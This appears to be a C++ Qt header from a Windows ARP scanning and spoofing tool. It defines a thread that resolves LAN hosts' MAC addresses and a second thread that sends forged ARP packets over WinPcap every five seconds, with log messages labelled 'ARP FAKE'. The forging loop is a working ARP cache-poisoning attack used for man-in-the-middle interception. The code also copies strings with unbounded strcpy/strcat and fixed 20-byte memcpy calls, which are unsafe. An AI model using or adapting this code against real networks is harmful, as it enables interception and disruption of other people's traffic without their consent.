#ifndef THREAD_H
#define THREAD_H
#include <QApplication>
#include <QThread>
#include "winapi.h"

class ScanThread : public QThread
{
    Q_OBJECT //使用信号与槽函数
public:
    ScanThread(QObject *parent = 0): QThread(parent){}
    //实现run接口
    void run(){
        in_addr target_addr;
        target_addr.S_un.S_addr=htonl((dstip));
        QString ip=inet_ntoa(target_addr);
        QString mac=LanScan(srcip,dstip);
        if(mac!="NULL") emit send(ip,mac);
        emit log(ip+" reply "+mac);

    };

    void setInfo(UINT src,UINT dst){
        srcip=src;
        dstip=dst;

    }

private:
    UINT srcip;
    UINT dstip;



//声明信号
signals:
    void send(QString,QString);
    void log(QString);
};


class SendThread : public QThread
{
    Q_OBJECT //使用信号与槽函数
public:
    SendThread(QObject *parent = 0): QThread(parent){}
    //实现run接口
    void run(){
        LPADAPTER lpAdapter=(LPADAPTER)PacketOpenAdapter(name);
        if (!lpAdapter||(lpAdapter->hFile==INVALID_HANDLE_VALUE)){
            emit log("ARP FAKE:Open Adapter ERROR");
            return;
        }
        LPPACKET lpPacket=PacketAllocatePacket();
        PacketInitPacket(lpPacket,buffer,512);
        while(flag){
            if(PacketSetNumWrites(lpAdapter,2)==FALSE){
                emit log("ARP FAKE:Packet SetNum ERROR");
                return;
            }

            if(PacketSendPacket(lpAdapter,lpPacket,TRUE)==FALSE){
                emit log("ARP FAKE:Packet Send ERROR");
                return;
            }
            emit log(datalog);
            QApplication::processEvents();
            Sleep(5000);

        }

    };

    void stop(){
        flag=false;
    }

    void setInfo(char* adaptername,QString s_mac,QString s_ip,QString d_mac,QString d_ip){
        strcpy(name, "//Device//NPF_");
        strcat(name, adaptername);
        datalog="src:"+s_ip+"("+s_mac+")"+"\ndst:"+d_ip+"("+d_mac+")";

        QByteArray tt;
        char* tch;
        char srcmac[20];
        char dstmac[20];
        char srcip[20];
        char dstip[20];

        tt=s_mac.toLatin1();
        tch=tt.data();
        memcpy(srcmac,tch,20);
        tt=s_ip.toLatin1();
        tch=tt.data();
        memcpy(srcip,tch,20);

        tt=d_mac.toLatin1();
        tch=tt.data();
        memcpy(dstmac,tch,20);
        tt=d_ip.toLatin1();
        tch=tt.data();
        memcpy(dstip,tch,20);

        constructARP(srcmac,dstmac,srcip,dstip,buffer);
        flag=true;


    }

private:
    char name[128];
    char buffer[512];
    QString datalog;
    bool flag;




//声明信号
signals:
    void log(QString);
};

#endif // THREAD_H
